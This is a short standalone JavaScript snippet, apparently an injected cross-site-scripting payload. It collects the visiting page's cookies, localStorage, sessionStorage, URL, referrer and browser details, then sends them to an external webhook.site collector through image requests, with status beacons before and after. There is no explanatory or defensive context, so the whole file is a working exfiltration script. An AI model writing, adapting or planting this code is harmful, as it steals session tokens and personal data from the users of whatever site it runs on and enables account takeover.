
new Image().src = 'https://webhook.site/7c5dd165-5305-44ad-bf69-9dec79c2d646?status=loaded&v=final';


let data = {
    url: window.location.href,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    referrer: document.referrer,
    title: document.title,
    domain: document.domain,
    cookies: document.cookie
};


new Image().src = 'https://webhook.site/7c5dd165-5305-44ad-bf69-9dec79c2d646?data=' + encodeURIComponent(JSON.stringify(data));


new Image().src = 'https://webhook.site/7c5dd165-5305-44ad-bf69-9dec79c2d646?debug=finish';
